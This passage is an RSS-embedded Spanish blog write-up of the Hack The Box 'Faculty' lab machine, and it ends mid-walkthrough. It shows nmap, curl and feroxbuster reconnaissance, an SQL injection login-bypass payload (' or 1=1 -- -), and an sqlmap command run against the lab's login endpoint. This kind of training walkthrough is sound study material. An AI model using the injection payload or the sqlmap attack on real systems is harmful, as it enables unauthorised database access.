<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>capabilities on sckull</title>
    <link>https://sckull.github.io/tags/capabilities/</link>
    <description>Recent content in capabilities on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 22 Oct 2022 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/capabilities/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Faculty</title>
        <link>https://sckull.github.io/posts/faculty/</link>
        <pubDate>Sat, 22 Oct 2022 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 22 Oct 2022 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/faculty/</guid>
        <description>La creación de PDFs a partir de etiquetas HTML de mPDF nos permitió obtener credenciales de una base de datos, los cuales nos dieron acceso a un primer usuario por SSH.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/faculty/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;La creación de PDFs a partir de etiquetas HTML de mPDF nos permitió obtener credenciales de una base de datos, los cuales nos dieron acceso a un primer usuario por SSH. Tras realizar Command Injection logramos obtener acceso a un segundo usuario. Finalmente escalamos privilegios a traves de GDB.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/480&#34;&gt;Faculty&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;os_type&#34;&gt; Linux &lt;img src=&#34;https://sckull.github.io/images/icons/linux.png&#34; class=&#34;img_type_os&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.11.169&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/36994&#34;&gt;gbyolo&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/36994&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[5.6, 5.6, 5.5, 4.5, 4.4],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;nmap&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;/code&gt; muestra multiples puertos abiertos: http (80) y ssh (22).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.92 scan initiated Mon Jul 18 18:43:37 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.169&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.11.169 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.11.169&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.063s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.18.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: nginx/1.18.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Did not follow redirect to http://faculty.htb
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Jul 18 18:43:46 2022 -- 1 IP address (1 host up) scanned in 9.43 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
&lt;p&gt;El sitio web presenta una redirección al dominio faculty.htb.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/faculty ❯ curl -sI 10.10.11.169
HTTP/1.1 &lt;span class=&#34;m&#34;&gt;302&lt;/span&gt; Moved Temporarily
Server: nginx/1.18.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Date: Mon, &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; 22:43:58 GMT
Content-Type: text/html
Content-Length: &lt;span class=&#34;m&#34;&gt;154&lt;/span&gt;
Connection: keep-alive
Location: http://faculty.htb

 π ~/htb/faculty ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El sitio unicamente muestra un formulario para el ingreso de un ID.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/faculty/Screenshot_website.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al realizar un &amp;ldquo;bypass&amp;rdquo; con &lt;code&gt;&#39; or 1=1 -- -&lt;/code&gt; logramos ingresar con el usuario Smith, unicamente se muestra un calendario.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/faculty/Screenshot_website_bypass.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;directory-brute-forcing&#34;&gt;Directory Brute Forcing&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;feroxbuster&lt;/code&gt; muestra nuevas direcciones como admin, en este encontramos multiples paginas php.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/faculty ❯ feroxbuster -u http://faculty.htb -x html,php,/ --silent
http://faculty.htb/admin
http://faculty.htb/test.php
http://faculty.htb/login.php
http://faculty.htb/admin/login.php
http://faculty.htb/admin/assets
http://faculty.htb/admin/download.php
http://faculty.htb/admin/database
http://faculty.htb/admin/assets/img
http://faculty.htb/admin/assets/css
http://faculty.htb/admin/assets/uploads
http://faculty.htb/admin/ajax.php
http://faculty.htb/admin/assets/uploads/gallery
http://faculty.htb/admin/users.php
http://faculty.htb/admin/home.php
http://faculty.htb/admin/events.php
http://faculty.htb/admin/index.php
http://faculty.htb/index.php
http://faculty.htb/admin/header.php
http://faculty.htb/admin/courses.php
http://faculty.htb/admin/assets/vendor
http://faculty.htb/admin/faculty.php
http://faculty.htb/admin/assets/vendor/jquery
http://faculty.htb/admin/navbar.php
http://faculty.htb/admin/db_connect.php
http://faculty.htb/admin/subjects.php
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras visitar la dirección admin/ observamos un &amp;ldquo;dashboard&amp;rdquo;, se muestra que ingresamos como Smith, seguramente está tomando la cookie del &amp;ldquo;login&amp;rdquo; anterior.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/faculty/Screenshot_website_admin.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;sqli&#34;&gt;SQLi&lt;/h1&gt;
&lt;p&gt;Como sabemos es posible realizar bypass al login, por lo que podríamos utilizar sqlmap para realizar una enumeración  y explotación. Observamos la base de datos scheduling_db.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/faculty ❯ sqlmap -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://faculty.htb/admin/ajax.php?action=login_faculty&amp;#34;&lt;/span&gt; --data &lt;span class=&#34;s2&#34;&gt;&amp;#34;id_no=1234567&amp;#34;&lt;/span&gt; --method POST -p id_no --batch --dbs --risk &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; level &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
        ___
       __H__
 ___ ___&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;,&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;_____ ___ ___  &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;1.6.4#stable&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ -&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; . &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;,&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; .&lt;span class=&#34;s1&#34;&gt;&amp;#39;| . |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|___|_  [,]_|_|_|__,|  _|
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;      |_|V...       |_|   https://sqlmap.org
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[.. snip ..]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[18:07:28] [INFO] target URL appears to have 10 columns in query
